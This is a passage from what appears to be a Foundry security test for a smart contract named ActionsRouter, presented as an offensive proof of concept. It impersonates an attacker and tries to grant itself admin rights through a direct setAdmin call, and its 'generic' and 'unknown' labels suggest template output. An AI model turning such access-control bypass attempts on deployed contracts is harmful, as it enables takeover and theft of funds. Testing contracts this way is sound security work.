        console.log("  AGL OFFENSIVE SECURITY - REAL PoC  ");
        console.log("======================================");
        console.log("Target Contract:", "ActionsRouter");
        console.log("Vulnerability:", "generic");
        console.log("Attacker Balance:", attackerInitialBalance / 1e18, "ETH");
    }


    function test_AccessControl_Bypass() public {
        console.log("\n[ATTACK] Access Control Bypass Attempt");
        console.log("Function:", "unknown");

        // Try to call privileged functions as non-admin
        vm.startPrank(attacker);

        bool bypassSuccessful = false;

        // Attempt 1: Direct admin function call
        (bool success1,) = targetAddress.call(
            abi.encodeWithSignature("setAdmin(address)", attacker)
